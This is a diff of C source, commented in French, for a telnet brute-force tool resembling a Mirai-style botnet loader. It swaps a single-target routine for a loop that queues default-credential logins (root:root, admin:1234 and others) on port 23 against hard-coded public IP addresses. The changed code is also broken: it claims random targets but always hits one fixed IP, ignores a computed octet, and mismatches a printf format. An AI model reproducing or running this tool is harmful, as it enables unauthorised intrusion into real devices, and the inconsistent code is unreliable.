@@ -107,18 +107,14 @@ void auto_scan_range(char *start_ip, char *end_ip)
     printf("\n[*] %d IPs queued.\n", total);
 }
 
-void auto_scan_single_ip(void)
+void auto_scan_random(void)
 {
     struct telnet_info info;
     uint32_t total = 0;
-    int found = 0;
-    
-    // L'IP cible
-    char *target_ip = "13.51.157.114";  // Changez ici
+    int max_scans = 1000;
     
     // Liste des credentials à tester
     char *credentials[] = {
-        "root:root",
         "root:admin",
         "root:12345",
         "root:password",
@@ -134,6 +130,7 @@ void auto_scan_single_ip(void)
         "root:abc123",
         "administrator:administrator",
         "admin:1234",
+        "root:root",
         "root:letmein",
         "admin:letmein",
         "root:master",
@@ -145,42 +142,35 @@ void auto_scan_single_ip(void)
     };
     int cred_count = sizeof(credentials) / sizeof(credentials[0]);
     
-    printf("=== TESTING SINGLE IP: %s ===\n", target_ip);
-    printf("Testing %d credentials...\n\n", cred_count);
+    srand(time(NULL));
+    printf("Testing ALL %d credentials for each IP\n", cred_count);
+    printf("Generating %d random IPs in 16.171.64.211\n\n", max_scans);
     
-    for (int c = 0; c < cred_count; c++)
+    for (int i = 0; i < max_scans; i++)
     {
         char strbuf[128];
+        uint8_t o4 = (rand() % 254) + 1;
         
-        // Construire la chaîne IP:port user:pass
-        snprintf(strbuf, sizeof(strbuf), "%s:23 %s", target_ip, credentials[c]);
-        
-        memset(&info, 0, sizeof(struct telnet_info));
-        
-        if (telnet_info_parse(strbuf, &info) != NULL)
+        // Pour chaque IP, tester TOUS les credentials
+        for (int c = 0; c < cred_count; c++)
         {
-            // server_queue_telnet est void - pas de retour
-            server_queue_telnet(srv, &info);
-            total++;
-            printf("[%d/%d] ✓ QUEUED: %s with %s\n", c+1, cred_count, target_ip, credentials[c]);
-            found = 1;
-            // Si vous voulez tester UNIQUEMENT le premier qui fonctionne
-            // break;
+            snprintf(strbuf, sizeof(strbuf), "16.171.64.211:23 %s", credentials[c]);
+            
+            memset(&info, 0, sizeof(struct telnet_info));
+            if (telnet_info_parse(strbuf, &info) != NULL)
+            {
+                server_queue_telnet(srv, &info);
+                total++;
+                printf("[%4d] Testing 16.171.64.211 with %s\n", 
+                       total, o4, credentials[c]);
+                usleep(10000); // 10ms pour être plus rapide (100 scans/sec)
+            }
         }
-        else
-        {
-            printf("[%d/%d] ✗ FAILED: %s with %s\n", c+1, cred_count, target_ip, credentials[c]);
-        }
-        
-        usleep(10000); // 10ms entre chaque tentative
     }
     
-    if (found == 0) {
-        printf("\n[✗] All %d credentials failed for %s\n", cred_count, target_ip);
-    } else {
-        printf("\n[✓] %d credentials queued for %s\n", total, target_ip);
-    }
+    printf("\n[*] %d login attempts queued.\n", total);
 }
+
 // ==================== MAIN ====================
 
 int main(int argc, char **args)
